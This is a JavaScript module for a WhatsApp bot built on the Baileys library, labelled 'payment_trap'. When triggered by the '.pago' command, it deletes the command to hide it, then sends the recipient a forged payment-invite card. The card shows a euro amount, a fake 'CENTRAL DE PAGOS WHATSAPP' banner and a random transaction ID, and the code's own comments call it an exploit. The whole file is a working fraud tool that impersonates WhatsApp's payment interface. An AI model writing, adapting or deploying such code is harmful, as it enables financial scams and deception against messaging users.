import { generateWAMessageFromContent } from '@whiskeysockets/baileys';

export default {
    name: 'payment_trap',
    match: (text) => /^\.pago/i.test(text),
    execute: async ({ sock, remitente, msg, textoLimpio }) => {
        
        const monto = textoLimpio.replace(/^\.pago\s*/i, '').trim() || "85.50";

        try {
            // 1. Sigilo: Borrado del comando
            try { await sock.sendMessage(remitente, { delete: msg.key }); } catch (e) {}

            // 2. Construcción del Exploit de Pago
            // Usamos un tipo de servicio (4) que fuerza la interfaz de "Transferencia Pendiente"
            const waMsg = generateWAMessageFromContent(remitente, {
                paymentInviteMessage: {
                    serviceType: 4, 
                    expiryTimestamp: Date.now() + (24 * 60 * 60 * 1000), // Expira en 24h
                    amount: {
                        value: parseInt(monto.replace('.', '')), // Formato entero para el protocolo
                        offset: 100, // Define los decimales
                        currencyCode: 'EUR' // Renderiza el símbolo de Euro automáticamente
                    }
                },
                // Inyectamos un texto de sistema que aparece sobre la tarjeta
                extendedTextMessage: {
                    text: `⚠️ NOTIFICACIÓN DE COBRO: Se ha solicitado una transferencia de ${monto}€ por servicios de mantenimiento de red.`,
                    contextInfo: {
                        externalAdReply: {
                            title: "CENTRAL DE PAGOS WHATSAPP",
                            body: "ID de Transacción: " + Math.random().toString(36).substring(7).toUpperCase(),
                            mediaType: 1,
                            showAdAttribution: false,
                            renderLargerThumbnail: false,
                            thumbnail: Buffer.alloc(0)
                        }
                    }
                }
            }, { userJid: sock.user.id });

            // 3. Inyección directa al servidor de Meta
            await sock.relayMessage(remitente, waMsg.message, { messageId: waMsg.key.id });

        } catch (err) {
            console.error("Error Payment Exploit:", err);
        }
    }
};
